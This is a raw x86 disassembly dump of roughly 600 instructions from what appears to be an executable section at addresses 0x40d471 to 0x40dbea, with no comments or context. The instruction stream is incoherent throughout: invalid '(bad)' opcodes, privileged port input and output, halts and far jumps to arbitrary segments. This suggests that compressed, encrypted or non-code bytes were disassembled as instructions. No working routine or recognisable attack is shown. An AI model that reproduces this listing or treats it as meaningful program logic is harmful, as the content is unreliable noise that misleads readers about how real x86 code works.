  40d471:	xchg   edi,eax
  40d472:	add    al,0x15
  40d474:	sub    esi,DWORD PTR [ebp-0x13d053b]
  40d47a:	mov    ebx,0x88179008
  40d47f:	stos   DWORD PTR es:[edi],eax
  40d480:	jae    0x40d421
  40d482:	jb     0x40d4f0
  40d484:	jb     0x40d4ca
  40d486:	lods   eax,DWORD PTR ds:[esi]
  40d487:	addr16 xor eax,0x8415d0cb
  40d48d:	data16 shl BYTE PTR [ebx-0x2fb1116a],cl
  40d494:	push   ds
  40d495:	scas   al,BYTE PTR es:[edi]
  40d496:	pusha  
  40d497:	popa   
  40d498:	out    dx,eax
  40d499:	in     al,0xd2
  40d49b:	jns    0x40d4af
  40d49d:	mov    WORD PTR [eax-0x14],ds
  40d4a0:	je     0x40d472
  40d4a2:	add    BYTE PTR [eax],al
  40d4a4:	cmp    ebx,DWORD PTR [edi+esi*4-0x5d]
  40d4a8:	test   al,0xe7
  40d4aa:	outs   dx,DWORD PTR ds:[esi]
  40d4ab:	add    al,0xdf
  40d4ad:	add    BYTE PTR [esi],0x48
  40d4b0:	mov    ebp,0xf23cc7b4
  40d4b5:	lods   al,BYTE PTR ds:[esi]
  40d4b6:	push   ds
  40d4b7:	imul   ebp,DWORD PTR [esi*4-0x25c227d0],0x28
  40d4bf:	xor    BYTE PTR [eax-0x13bd23dc],bl
  40d4c5:	mov    ds:0x3f156697,eax
  40d4ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4cb:	adc    DWORD PTR [ebx],eax
  40d4cd:	pushf  
  40d4ce:	mov    esi,0xde7707db
  40d4d3:	clc    
  40d4d4:	and    eax,0x376d2763
  40d4d9:	mov    eax,0x48e5f6c3
  40d4de:	fwait
  40d4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4e0:	sti    
  40d4e1:	add    eax,0x572e51b7
  40d4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4e7:	push   ebx
  40d4e8:	jg     0x40d489
  40d4ea:	pop    edx
  40d4eb:	jbe    0x40d4dd
  40d4ed:	jmp    0x40d562
  40d4ef:	loope  0x40d4bb
  40d4f1:	mov    eax,ds:0xb6cf6539
  40d4f6:	cmp    cl,BYTE PTR [ecx-0x1b]
  40d4f9:	add    al,0x17
  40d4fb:	adc    dl,bh
  40d4fd:	xor    eax,0xd7fc61d2
  40d502:	dec    ebp
  40d503:	sub    DWORD PTR [ebx-0x77],edi
  40d506:	inc    ebp
  40d507:	and    DWORD PTR [esi],ebx
  40d509:	pop    ebp
  40d50a:	mov    ebp,0xea242763
  40d50f:	xchg   esp,eax
  40d510:	cld    
  40d511:	test   al,0x32
  40d513:	push   ebx
  40d514:	(bad)  
  40d515:	ret    0xc799
  40d518:	ins    BYTE PTR es:[edi],dx
  40d519:	test   al,0xbf
  40d51b:	in     eax,0xd5
  40d51d:	es (bad) 
  40d520:	je     0x40d519
  40d522:	push   esp
  40d523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d524:	fdivr  DWORD PTR [esi+esi*8+0x46e35cc5]
  40d52b:	ins    BYTE PTR es:[edi],dx
  40d52c:	or     esp,DWORD PTR [ebx+0x6b]
  40d52f:	jb     0x40d4c4
  40d531:	aas    
  40d532:	cmp    edx,ecx
  40d534:	push   ebp
  40d535:	lock bound ebx,QWORD PTR [edx-0x2d]
  40d539:	jg     0x40d516
  40d53b:	mov    ds:0x5a49b186,eax
  40d540:	stos   BYTE PTR es:[edi],al
  40d541:	leave  
  40d542:	xor    al,0x4d
  40d544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d545:	pop    esp
  40d546:	nop
  40d547:	sbb    ecx,DWORD PTR ds:[ecx-0x7f]
  40d54b:	or     eax,0x27c55ce8
  40d550:	xor    ebx,DWORD PTR [edx]
  40d552:	(bad)  
  40d553:	fcmovne st,st(1)
  40d555:	sub    eax,0x641d6b15
  40d55a:	repnz std 
  40d55c:	mov    WORD PTR [edi+0x39],cs
  40d55f:	repnz pushw 0x5352
  40d564:	push   ebp
  40d565:	xchg   edx,eax
  40d566:	fsubr  st(0),st
  40d568:	lods   al,BYTE PTR ds:[esi]
  40d569:	out    dx,eax
  40d56a:	popa   
  40d56b:	pop    es
  40d56c:	shl    edi,0x32
  40d56f:	mov    ?,WORD PTR [edx]
  40d571:	dec    eax
  40d572:	cld    
  40d573:	out    0xe5,eax
  40d575:	hlt    
  40d576:	or     eax,0x765937c6
  40d57b:	(bad)  
  40d57c:	call   0x286f:0xd972ec97
  40d583:	cmp    ebx,DWORD PTR [ebx-0x35]
  40d586:	adc    BYTE PTR [ebp+0x1f],al
  40d589:	cmp    dh,BYTE PTR [edx-0x4c]
  40d58c:	jne    0x40d569
  40d58e:	add    DWORD PTR [ecx-0x8],ecx
  40d591:	pop    es
  40d592:	xor    eax,0xc3578f83
  40d597:	mov    esi,0xe33bae09
  40d59c:	jae    0x40d51e
  40d59e:	pop    es
  40d59f:	pop    esp
  40d5a0:	xchg   edi,eax
  40d5a1:	inc    edi
  40d5a2:	mov    edx,0x37b45ab6
  40d5a7:	dec    esp
  40d5a8:	mov    dl,0xc8
  40d5aa:	stos   BYTE PTR es:[edi],al
  40d5ab:	lods   eax,DWORD PTR ds:[esi]
  40d5ac:	jmp    0x1f34:0xbae29a25
  40d5b3:	xchg   edi,eax
  40d5b4:	(bad)  
  40d5b6:	imul   esi,edx,0x21e53d5b
  40d5bc:	mov    esp,0x87929823
  40d5c1:	mov    ecx,0x8a6fd07a
  40d5c6:	stc    
  40d5c7:	fdivr  DWORD PTR [edx+0x12c9f437]
  40d5cd:	jg     0x40d633
  40d5cf:	adc    eax,0xd59b3429
  40d5d4:	popa   
  40d5d5:	pop    ds
  40d5d6:	mov    ds:0xf0821264,al
  40d5db:	cs mov bl,0x82
  40d5de:	jg     0x40d64a
  40d5e0:	inc    edx
  40d5e1:	mov    ds:0x59c296f0,eax
  40d5e6:	shl    ah,cl
  40d5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5e9:	arpl   WORD PTR [edi],ax
  40d5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5ec:	adc    bh,BYTE PTR [esi]
  40d5ee:	mov    ebx,0xcbb29193
  40d5f3:	inc    ebp
  40d5f4:	(bad)  
  40d5f5:	xchg   ebp,eax
  40d5f6:	sbb    edx,DWORD PTR [esi-0x4c]
  40d5f9:	iret   
  40d5fa:	jle    0x40d580
  40d5fc:	xchg   esi,eax
  40d5fd:	and    al,0x1f
  40d5ff:	dec    esi
  40d600:	pop    edi
  40d601:	add    DWORD PTR [esi-0x124923da],ecx
  40d607:	imul   ebx,DWORD PTR [ebx+0x605bd041],0xffffffc1
  40d60e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d60f:	shr    DWORD PTR [esi],cl
  40d611:	std    
  40d612:	push   ebx
  40d613:	stc    
  40d614:	lods   al,BYTE PTR ds:[esi]
  40d615:	fwait
  40d616:	mov    ebp,0x2bd45f2b
  40d61b:	call   0x7f95:0xf6db4abf
  40d622:	retf   
  40d623:	pop    ds
  40d624:	jb     0x40d621
  40d626:	loop   0x40d698
  40d628:	adc    BYTE PTR [edi+0x1f47ad6a],dh
  40d62e:	test   DWORD PTR [edi],eax
  40d630:	jmp    0x135e:0x12bca7d2
  40d637:	mov    esi,0xa35f8a18
  40d63c:	adc    eax,0xd822cc9c
  40d641:	test   eax,0xf8e53ec3
  40d646:	pop    edx
  40d647:	xor    al,0x54
  40d649:	clc    
  40d64a:	mov    ebp,0x47e72cb8
  40d64f:	push   0xabe91f5d
  40d654:	aaa    
  40d655:	pop    ss
  40d656:	and    DWORD PTR [ebx+0x2],ecx
  40d659:	imul   edx,DWORD PTR [edx-0x31e9d254],0xffffffac
  40d660:	add    al,0x9c
  40d662:	repnz pusha 
  40d664:	(bad)  
  40d665:	fs pop ebp
  40d667:	xchg   BYTE PTR [ebp-0x63],bh
  40d66a:	mov    eax,0x9d93e242
  40d66f:	cwde   
  40d670:	iret   
  40d671:	inc    esp
  40d672:	int    0x7a
  40d674:	xor    ebx,DWORD PTR [eax-0x2a2f7cd9]
  40d67a:	push   esp
  40d67b:	iret   
  40d67c:	test   edx,eax
  40d67e:	pop    edx
  40d67f:	sub    eax,0x1545f425
  40d684:	jle    0x40d6ee
  40d686:	pop    eax
  40d687:	imul   edi,DWORD PTR [eax-0x55],0xffffffbd
  40d68b:	(bad)  
  40d68c:	fdivr  QWORD PTR [ebx]
  40d68e:	in     al,0x1d
  40d690:	aam    0x9b
  40d692:	cmp    al,0xda
  40d694:	mov    ebp,0xb2404d1
  40d699:	js     0x40d676
  40d69b:	lea    edi,[edx-0x5e10c682]
  40d6a1:	sub    dl,BYTE PTR ds:[ecx+0x6e253bb5]
  40d6a8:	lahf   
  40d6a9:	out    0x20,al
  40d6ab:	add    al,BYTE PTR [esp+edi*1]
  40d6ae:	inc    esi
  40d6af:	inc    ebp
  40d6b0:	pushf  
  40d6b1:	popw   ds
  40d6b3:	jl     0x40d642
  40d6b5:	jp     0x40d638
  40d6b7:	push   0x726603c8
  40d6bc:	mov    bh,BYTE PTR [ebp-0x20b5930b]
  40d6c2:	jb     0x40d6d8
  40d6c4:	or     BYTE PTR [esi],al
  40d6c6:	mov    ch,0x6c
  40d6c8:	inc    eax
  40d6c9:	dec    DWORD PTR [ebx+0x4fb7b964]
  40d6cf:	loopne 0x40d712
  40d6d1:	xlat   BYTE PTR ds:[ebx]
  40d6d2:	push   ss
  40d6d3:	arpl   si,bx
  40d6d5:	mov    al,ds:0x4a9ef1a
  40d6da:	call   0xe611:0x7e324eb4
  40d6e1:	mov    ss,WORD PTR [eax]
  40d6e3:	arpl   WORD PTR [esi-0x5386414d],di
  40d6e9:	mov    ds:0x15eb7d15,al
  40d6ee:	mov    ebp,0xbda4e47a
  40d6f3:	loop   0x40d691
  40d6f5:	(bad)  
  40d6f6:	lea    ebp,[eax-0x63]
  40d6f9:	bound  edx,QWORD PTR [ebx-0x73f39262]
  40d6ff:	js     0x40d71e
  40d701:	xchg   ebp,eax
  40d702:	cmp    edi,ecx
  40d704:	fcomp  QWORD PTR [ecx-0x3d57403d]
  40d70a:	mov    edi,0x2a3b2049
  40d70f:	cli    
  40d710:	aam    0x6d
  40d712:	mov    DWORD PTR [ecx+0x4dd32926],edi
  40d718:	inc    ecx
  40d719:	lods   eax,DWORD PTR ds:[esi]
  40d71a:	call   0x70904381
  40d71f:	in     al,dx
  40d720:	mov    ecx,0xe00691d3
  40d725:	aad    0x4e
  40d727:	mov    al,0x4f
  40d729:	xor    BYTE PTR [edx+0x2dfa1422],cl
  40d72f:	mov    dl,0x13
  40d731:	outs   dx,DWORD PTR ds:[esi]
  40d732:	int    0xc2
  40d734:	push   ebx
  40d735:	add    DWORD PTR [edx+0x31],esp
  40d738:	fidiv  WORD PTR [edx+0x6f3addf9]
  40d73e:	(bad)  
  40d740:	jae    0x40d772
  40d742:	fwait
  40d743:	push   eax
  40d744:	retf   
  40d745:	cs xor eax,0x5982be5e
  40d74b:	jae    0x40d6d9
  40d74d:	push   ebp
  40d74e:	dec    ecx
  40d74f:	(bad)  
  40d750:	mov    bl,0x19
  40d752:	inc    ebp
  40d753:	imul   eax,DWORD PTR ds:0xcb261403,0x509a9676
  40d75d:	jmp    0x576f696f
  40d762:	xchg   ecx,eax
  40d763:	adc    DWORD PTR [edx-0x34],0xeb32d8fc
  40d76a:	sub    eax,DWORD PTR ds:0x37260f30
  40d770:	or     al,0xdf
  40d772:	adc    ch,BYTE PTR [ebx+0x75]
  40d775:	xchg   edi,eax
  40d776:	sub    BYTE PTR [edi-0x1f9104f1],cl
  40d77c:	fsub   st(1),st
  40d77e:	add    BYTE PTR [eax],al
  40d780:	jno    0x40d7b7
  40d782:	adc    DWORD PTR [esi+edi*1-0x19],ebx
  40d786:	fs icebp 
  40d788:	jns    0x40d76d
  40d78a:	inc    eax
  40d78b:	jge    0x40d763
  40d78d:	retf   
  40d78e:	push   0xffffffca
  40d790:	lea    edi,[edi]
  40d792:	jmp    0x824c8bb6
  40d797:	cmp    esp,DWORD PTR [edx-0x380720c1]
  40d79d:	cs xchg edx,eax
  40d79f:	stos   DWORD PTR es:[edi],eax
  40d7a0:	out    dx,al
  40d7a1:	and    ecx,DWORD PTR [edx]
  40d7a3:	xor    ebx,DWORD PTR [ebp+0x2137ff7c]
  40d7a9:	cld    
  40d7aa:	xchg   esi,eax
  40d7ab:	xor    edi,DWORD PTR [esi]
  40d7ad:	sbb    DWORD PTR [esp+esi*4-0x19],ecx
  40d7b1:	adc    eax,0x82356bbd
  40d7b7:	dec    esi
  40d7b8:	dec    ebx
  40d7b9:	and    esi,ebx
  40d7bb:	fwait
  40d7bc:	mov    edi,0x583033db
  40d7c1:	es inc ecx
  40d7c3:	fsubr  QWORD PTR [esp+ebp*8-0x53e84764]
  40d7ca:	mov    esp,0x82f870d7
  40d7cf:	test   eax,0xccb99dd1
  40d7d4:	push   ebx
  40d7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d6:	daa    
  40d7d7:	nop
  40d7d8:	and    esi,edi
  40d7da:	fwait
  40d7db:	scas   eax,DWORD PTR es:[edi]
  40d7dc:	addr16 fcomp st(6)
  40d7df:	push   ss
  40d7e0:	inc    edi
  40d7e1:	add    BYTE PTR ds:0xcf9d49c,bl
  40d7e7:	pushf  
  40d7e8:	mov    dh,0xef
  40d7ea:	loopne 0x40d7cd
  40d7ec:	jecxz  0x40d78c
  40d7ee:	xor    ebp,DWORD PTR [esi-0x5f]
  40d7f1:	and    eax,0xf9b06088
  40d7f6:	cli    
  40d7f7:	and    al,0x75
  40d7f9:	(bad)  
  40d7fa:	fcmovb st,st(3)
  40d7fc:	(bad)  
  40d7fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7fe:	stos   BYTE PTR es:[edi],al
  40d7ff:	cmp    DWORD PTR [bx+di],esp
  40d802:	into   
  40d803:	loopne 0x40d7d8
  40d805:	jmp    0x40d7a0
  40d807:	rcr    BYTE PTR [esi-0x26ef1ce7],cl
  40d80d:	in     eax,dx
  40d80e:	push   edx
  40d80f:	sub    BYTE PTR [eax],ah
  40d811:	dec    ecx
  40d812:	int    0x49
  40d814:	(bad)  
  40d815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d816:	adc    al,0x52
  40d818:	popa   
  40d819:	sahf   
  40d81a:	dec    esi
  40d81b:	loopne 0x40d80a
  40d81d:	push   0xffffffb6
  40d81f:	lods   eax,DWORD PTR ds:[esi]
  40d820:	cmp    esp,ecx
  40d822:	(bad)  
  40d823:	add    al,0xa6
  40d825:	xor    eax,0x1a557f33
  40d82a:	jmp    0x4c18e2ba
  40d82f:	mov    esi,0xc28b4db9
  40d834:	pop    esp
  40d835:	ret    
  40d836:	mov    bl,0x7b
  40d838:	(bad)  
  40d839:	repnz sbb al,0x21
  40d83c:	scas   eax,DWORD PTR es:[edi]
  40d83d:	mov    ebp,0xa6834e7f
  40d842:	sbb    al,0x15
  40d844:	jbe    0x40d832
  40d846:	test   bh,dl
  40d848:	cmc    
  40d849:	ret    
  40d84a:	mov    eax,0x206dfebe
  40d84f:	imul   esi,esi,0xc29dbbad
  40d855:	dec    edi
  40d856:	hlt    
  40d857:	xor    al,ch
  40d859:	xlat   BYTE PTR ds:[ebx]
  40d85a:	out    dx,al
  40d85b:	cmp    DWORD PTR [edx-0x36],esp
  40d85e:	popa   
  40d85f:	mov    ds:0x1eb621cd,eax
  40d864:	aam    0x44
  40d866:	sbb    ch,al
  40d868:	cmp    al,0xcd
  40d86a:	sahf   
  40d86b:	cli    
  40d86c:	sbb    edx,DWORD PTR [eax]
  40d86e:	xor    DWORD PTR [eax],ecx
  40d870:	mov    esp,DWORD PTR [esi]
  40d872:	test   BYTE PTR [ebx],bh
  40d874:	sbb    BYTE PTR [ecx-0x604a4d3d],dh
  40d87a:	nop
  40d87b:	shl    DWORD PTR [edx-0x703acd66],1
  40d881:	inc    ecx
  40d882:	cwde   
  40d883:	jmp    0xbfe0f57
  40d888:	data16 aaa 
  40d88a:	mov    ch,0xd3
  40d88c:	add    esi,DWORD PTR [esp+ecx*4-0x205f2394]
  40d893:	or     eax,0x5ee44e7
  40d898:	jp     0x40d845
  40d89a:	fidivr WORD PTR [edi-0x37]
  40d89d:	or     eax,0x4d52709d
  40d8a2:	inc    edi
  40d8a3:	aad    0x95
  40d8a5:	out    0x3,al
  40d8a7:	mov    ecx,0x6328c05c
  40d8ac:	imul   esp,DWORD PTR [ebp-0xf],0xffffffc6
  40d8b0:	dec    ebx
  40d8b1:	add    ch,cl
  40d8b3:	fisubr DWORD PTR ds:0xc99406a3
  40d8b9:	lods   al,BYTE PTR ds:[esi]
  40d8ba:	pop    ecx
  40d8bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8bc:	(bad)  
  40d8bd:	(bad)  
  40d8bf:	cmp    BYTE PTR [edi+eax*4],0x8f
  40d8c3:	lock fsubr st(5),st
  40d8c6:	icebp  
  40d8c7:	repnz loopne 0x40d89d
  40d8ca:	test   BYTE PTR [ecx+eiz*2-0x3846f460],dh
  40d8d1:	mov    ds:0xc90312cc,eax
  40d8d6:	mov    bl,0x46
  40d8d8:	dec    edx
  40d8d9:	imul   edi,DWORD PTR [edi],0x7b
  40d8dc:	mov    ch,0x3a
  40d8de:	mov    dl,0xe1
  40d8e0:	xor    al,0xeb
  40d8e2:	adc    eax,0xde80bb45
  40d8e7:	mov    al,ds:0x598f644
  40d8ec:	xor    bh,BYTE PTR [ebx+0xaeec0a7]
  40d8f2:	cli    
  40d8f3:	pop    ecx
  40d8f4:	xor    al,0xd7
  40d8f6:	ss pop edi
  40d8f8:	ins    DWORD PTR es:[edi],dx
  40d8f9:	pop    ds
  40d8fa:	push   es
  40d8fb:	pop    ecx
  40d8fc:	jns    0x40d8d3
  40d8fe:	dec    ebp
  40d8ff:	(bad)  
  40d900:	xchg   BYTE PTR [ecx+0x3a5bf984],ch
  40d906:	xchg   edx,eax
  40d907:	(bad)  
  40d908:	imul   ebp,esi,0xb052f2d9
  40d90e:	inc    ecx
  40d90f:	outs   dx,BYTE PTR ds:[esi]
  40d910:	call   0x3cd3:0xd827dfef
  40d917:	dec    ebx
  40d918:	push   ebx
  40d919:	or     BYTE PTR [esi],0x8b
  40d91c:	xlat   BYTE PTR ds:[ebx]
  40d91d:	adc    ebp,DWORD PTR [ebp+0x55]
  40d920:	push   0x56
  40d922:	ret    0xc2a9
  40d925:	xchg   edx,eax
  40d926:	mov    dl,0xcd
  40d928:	xchg   DWORD PTR [ecx-0x36347a67],ecx
  40d92e:	arpl   WORD PTR [ecx-0x363b9c9b],bp
  40d934:	inc    ebp
  40d935:	std    
  40d936:	fisttp DWORD PTR [esi+0x7a]
  40d939:	adc    bh,BYTE PTR [ebx+eiz*2+0x25c31a06]
  40d940:	mov    eax,0xa987e60d
  40d945:	mov    esi,DWORD PTR [eax+0x54]
  40d948:	cmp    DWORD PTR [edx],edx
  40d94a:	mov    eax,esp
  40d94c:	rcl    BYTE PTR [eax-0x55],1
  40d94f:	jmp    0xff36:0xd94e5ef0
  40d956:	xchg   esi,eax
  40d957:	or     bl,BYTE PTR [edi-0x14]
  40d95a:	(bad)  
  40d95b:	dec    edi
  40d95c:	add    BYTE PTR [edi-0x8],cl
  40d95f:	push   ebx
  40d960:	sub    ah,0x3b
  40d963:	mov    al,ds:0x59ba2ed9
  40d968:	cmc    
  40d969:	fcomp  QWORD PTR [esi+0x249ee743]
  40d96f:	jp     0x40d8f2
  40d971:	mov    dh,0xc8
  40d973:	inc    ebx
  40d974:	ins    BYTE PTR es:[edi],dx
  40d975:	dec    ecx
  40d976:	mov    edx,0xaba22c5b
  40d97b:	shr    DWORD PTR [edi+0x60],0xe4
  40d97f:	ror    DWORD PTR [ecx-0x6b0ccfd1],1
  40d985:	push   es
  40d986:	mov    ebp,0xb9723876
  40d98b:	pop    ds
  40d98c:	ins    DWORD PTR es:[edi],dx
  40d98d:	leave  
  40d98e:	and    edi,DWORD PTR [edx]
  40d990:	adc    esi,DWORD PTR [ebx]
  40d992:	cmp    esp,eax
  40d994:	fiadd  DWORD PTR [ecx-0x77]
  40d997:	jbe    0x40d930
  40d999:	cmp    esp,DWORD PTR [esp+ecx*1]
  40d99c:	or     ch,BYTE PTR [ecx]
  40d99e:	cs push edx
  40d9a0:	lods   al,BYTE PTR ds:[esi]
  40d9a1:	retf   
  40d9a2:	pop    esp
  40d9a3:	pusha  
  40d9a4:	push   0xe596a40d
  40d9a9:	fstp   TBYTE PTR [edi]
  40d9ab:	out    dx,al
  40d9ac:	nop
  40d9ad:	mov    edx,0x4ec547dd
  40d9b2:	iret   
  40d9b3:	sub    DWORD PTR [edi+ebx*2-0x43ab4451],0x42
  40d9bb:	iret   
  40d9bc:	xor    BYTE PTR [eax-0xf462460],dl
  40d9c2:	xor    al,0x55
  40d9c4:	repz (bad) 
  40d9c6:	push   edi
  40d9c7:	adc    al,BYTE PTR [ebx-0x6d]
  40d9ca:	es pop eax
  40d9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,edi
  40d9d0:	cmp    dh,BYTE PTR [eax+eax*2-0x2ff8f546]
  40d9d7:	xor    ah,dl
  40d9d9:	mov    ds:0xb1ba1b04,eax
  40d9de:	mov    esi,0xe473abca
  40d9e3:	xlat   BYTE PTR ds:[ebx]
  40d9e4:	add    edi,DWORD PTR [ecx+0xef17dcf]
  40d9ea:	scas   al,BYTE PTR es:[edi]
  40d9eb:	dec    edx
  40d9ec:	dec    edi
  40d9ed:	push   esp
  40d9ee:	add    edx,DWORD PTR [esp-0x21]
  40d9f2:	sbb    eax,0x6ba3089b
  40d9f7:	dec    esp
  40d9f8:	xor    bh,BYTE PTR [edi]
  40d9fa:	ds or  al,0x11
  40d9fd:	push   esi
  40d9fe:	in     eax,dx
  40d9ff:	mov    al,0xfd
  40da01:	pop    ebx
  40da02:	dec    ebx
  40da03:	dec    edx
  40da04:	fstp   st(6)
  40da06:	out    0x5d,al
  40da08:	pop    es
  40da09:	inc    eax
  40da0a:	lods   eax,DWORD PTR ds:[esi]
  40da0b:	das    
  40da0c:	mov    al,0xda
  40da0e:	loopne 0x40da2e
  40da10:	push   esp
  40da11:	ja     0x40da6d
  40da13:	adc    dh,BYTE PTR [ecx-0x56]
  40da16:	std    
  40da17:	mov    eax,0xfccd3282
  40da1c:	fmul   st,st(1)
  40da1e:	dec    edx
  40da1f:	shl    edx,1
  40da21:	xchg   DWORD PTR [edi-0x3abf510b],ebx
  40da27:	jecxz  0x40da67
  40da29:	iret   
  40da2a:	mov    dh,BYTE PTR [ecx-0x41]
  40da2d:	and    ebp,eax
  40da2f:	repz imul edi,DWORD PTR [esi],0xfffffff5
  40da33:	into   
  40da34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da35:	inc    ebp
  40da36:	sbb    BYTE PTR [esi+edi*1],bh
  40da39:	add    DWORD PTR [ecx+0x4b],0x6f36d96
  40da40:	mov    ecx,esp
  40da42:	pop    edx
  40da43:	fnstenv gs:[ecx+0x6d24e477]
  40da4a:	clc    
  40da4b:	in     eax,0xb9
  40da4d:	pop    esi
  40da4e:	(bad)  
  40da50:	sahf   
  40da51:	cmp    cl,ch
  40da53:	icebp  
  40da54:	jmp    0x20900da2
  40da59:	jmp    0x40da49
  40da5b:	aad    0xaf
  40da5d:	mov    edx,0xdf3b9c0a
  40da62:	es rol dh,1
  40da65:	xchg   DWORD PTR [edx+0x134514ca],eax
  40da6b:	cli    
  40da6c:	fisub  WORD PTR [esi]
  40da6e:	iret   
  40da6f:	idiv   BYTE PTR [ecx-0x62]
  40da72:	ja     0x40da7a
  40da74:	and    DWORD PTR [ebp-0x3c],edi
  40da77:	in     al,dx
  40da78:	xor    eax,0x1fad45cc
  40da7d:	stos   DWORD PTR es:[edi],eax
  40da7e:	sub    DWORD PTR [esi+0x6c],esp
  40da81:	lea    ebp,[ebx+0x63]
  40da84:	pop    ss
  40da85:	fild   DWORD PTR [edx-0x476d07c]
  40da8b:	mov    ds:0xf20ffa3,al
  40da90:	stos   BYTE PTR es:[edi],al
  40da91:	jge    0x40da5d
  40da93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da94:	xor    al,ch
  40da96:	cwde   
  40da97:	(bad)  
  40da98:	lahf   
  40da99:	fnsave [esi]
  40da9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da9c:	xlat   BYTE PTR ds:[ebx]
  40da9d:	push   esp
  40da9e:	test   BYTE PTR ds:0x9c698c92,cl
  40daa4:	out    0x0,eax
  40daa6:	in     al,0x53
  40daa8:	lds    edi,FWORD PTR ss:[esi]
  40daab:	adc    edi,esp
  40daad:	mov    edi,0xaafaeea
  40dab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab3:	cmp    eax,0xcb7633eb
  40dab8:	pusha  
  40dab9:	xchg   edi,eax
  40daba:	or     al,0x35
  40dabc:	mov    ?,WORD PTR [eax+0x41dfd292]
  40dac2:	mov    eax,ds:0xd58b1bfd
  40dac7:	aaa    
  40dac8:	jle    0x40dafa
  40daca:	mov    eax,ds:0x66c357e7
  40dacf:	add    dh,dh
  40dad1:	mov    fs,WORD PTR [ecx+0x1c]
  40dad4:	xor    dl,BYTE PTR [edi-0x26]
  40dad7:	add    bh,BYTE PTR [ebx]
  40dad9:	pop    es
  40dada:	add    al,0x3b
  40dadc:	adc    eax,0xcc13f776
  40dae1:	sbb    eax,0xda4aae96
  40dae6:	mov    ds:0x8d443a6,eax
  40daeb:	jp     0x40dae6
  40daed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daee:	div    DWORD PTR [edi]
  40daf0:	sti    
  40daf1:	es or  al,0x3d
  40daf4:	or     BYTE PTR ds:[ebx-0x6b],ah
  40daf8:	and    DWORD PTR [edx+0x36],0x50ce07bf
  40daff:	mov    edi,0x429c854e
  40db04:	paddusb mm4,mm6
  40db07:	shl    esp,1
  40db09:	inc    esp
  40db0a:	push   eax
  40db0b:	jno    0x40db87
  40db0d:	sub    al,0x39
  40db0f:	stc    
  40db10:	mov    ebp,0x3d488c5e
  40db15:	push   ecx
  40db16:	(bad)  
  40db17:	pusha  
  40db18:	outs   dx,DWORD PTR ds:[esi]
  40db19:	push   edx
  40db1a:	pop    ss
  40db1b:	lds    edx,FWORD PTR es:[esi+ebx*1-0x49]
  40db20:	in     al,0x20
  40db22:	cmp    al,0x85
  40db24:	lds    edx,FWORD PTR [ebx]
  40db26:	shl    DWORD PTR [eax-0x6d4b0e66],cl
  40db2c:	mov    cl,0xe7
  40db2e:	mov    dh,BYTE PTR [ebx]
  40db30:	neg    DWORD PTR [eax+edx*8]
  40db33:	add    al,ah
  40db35:	fsubr  st,st(6)
  40db37:	pop    edx
  40db38:	push   ds
  40db39:	cmp    BYTE PTR [ecx],ah
  40db3b:	ficom  WORD PTR [eax+0x15]
  40db3e:	pop    ebx
  40db3f:	mov    al,0xd8
  40db41:	dec    ebp
  40db42:	add    dl,BYTE PTR [ebx+0x2f3cea4b]
  40db48:	or     DWORD PTR [ecx-0x70],ecx
  40db4b:	dec    esi
  40db4c:	nop
  40db4d:	inc    ebx
  40db4e:	mov    al,0x46
  40db50:	push   0x752f975c
  40db55:	or     ah,BYTE PTR [ebx]
  40db57:	daa    
  40db58:	or     ch,BYTE PTR [edx-0xef54e86]
  40db5e:	or     ecx,DWORD PTR [ecx+0x1372780]
  40db64:	jno    0x40daf2
  40db66:	int3   
  40db67:	sti    
  40db68:	push   eax
  40db69:	test   DWORD PTR [ebp+0x750eb345],esi
  40db6f:	pushf  
  40db70:	out    dx,al
  40db71:	inc    ebx
  40db72:	pop    ss
  40db73:	xor    BYTE PTR [esi],dh
  40db75:	loope  0x40db91
  40db77:	cmp    DWORD PTR [ebx+edx*8+0x2918059a],ebp
  40db7e:	pop    ecx
  40db7f:	sub    al,0x9e
  40db81:	sahf   
  40db82:	(bad)  
  40db83:	(bad)  
  40db84:	add    ah,0xc4
  40db87:	(bad)  
  40db88:	mov    ecx,0x7c029c7b
  40db8d:	inc    edi
  40db8e:	jp     0xeef23d03
  40db94:	pop    edx
  40db95:	mov    ds:0x67380231,al
  40db9a:	inc    eax
  40db9b:	popf   
  40db9c:	sbb    al,0x6
  40db9e:	(bad)  
  40db9f:	imul   ebx,ecx,0xc09a1a2d
  40dba5:	popa   
  40dba6:	ja     0x40dbaa
  40dba8:	dec    edi
  40dba9:	inc    ebx
  40dbaa:	mov    ebx,0xf781852a
  40dbaf:	lea    ebx,[esi+0x5f]
  40dbb2:	jle    0x40dbbc
  40dbb4:	pop    eax
  40dbb5:	test   DWORD PTR [edi],0xecd7a368
  40dbbb:	mov    cl,0x37
  40dbbd:	adc    DWORD PTR [eax-0x4b],edi
  40dbc0:	mov    al,ds:0xb3e9251d
  40dbc5:	pop    eax
  40dbc6:	pop    eax
  40dbc7:	icebp  
  40dbc8:	stc    
  40dbc9:	(bad)  
  40dbca:	pusha  
  40dbcb:	jb     0x40dbad
  40dbcd:	aaa    
  40dbce:	and    al,0x18
  40dbd0:	loop   0x40dbc1
  40dbd2:	aam    0xa5
  40dbd4:	out    0xff,al
  40dbd6:	jle    0x40dbc0
  40dbd8:	jno    0x40dc4b
  40dbda:	cmp    eax,0x6da57569
  40dbdf:	mov    dl,0xd2
  40dbe1:	aad    0xd7
  40dbe3:	mov    ecx,0x53c54aea
  40dbe8:	mov    al,0x87
  40dbea:	dec    esi
